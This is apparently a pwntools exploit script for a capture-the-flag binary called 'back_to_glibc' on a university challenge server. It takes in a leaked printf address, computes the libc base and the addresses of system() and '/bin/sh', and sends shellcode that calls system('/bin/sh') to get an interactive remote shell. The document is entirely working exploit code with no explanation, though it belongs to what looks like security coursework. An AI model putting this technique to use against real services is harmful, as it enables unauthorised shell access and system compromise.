from pwn import *

context.arch = 'amd64'
context.log_level = 'info' 

binary = ELF('./back_to_glibc')
libc = ELF('libc.so.6')

p = remote("offsec-chalbroker.osiris.cyber.nyu.edu", 1292)
p.sendline(b"vc2499")

p.recvuntil(b'This time you can have this one: ')
leaked_address = u64(p.recvline().strip().ljust(8, b'\x00'))
print(f"Leaked libc address: {hex(leaked_address)}")

libc_base = leaked_address - libc.symbols["printf"]
system_addr = libc_base + libc.symbols["system"]
bin_sh_addr = libc_base + next(libc.search(b"/bin/sh"))

print(f"libc base: {hex(libc_base)}")
print(f"system() address: {hex(system_addr)}")
print(f"'/bin/sh' address: {hex(bin_sh_addr)}")

shellcode = asm(f'''
    sub rsp, 8               # Align stack
    mov rdi, {bin_sh_addr}   # Set RDI to "/bin/sh" address
    mov rax, {system_addr}   # Set RAX to system() address
    call rax                 # Call system("/bin/sh")
''')

payload = shellcode.ljust(0x50, b"\x90") 

p.send(payload)
p.interactive()

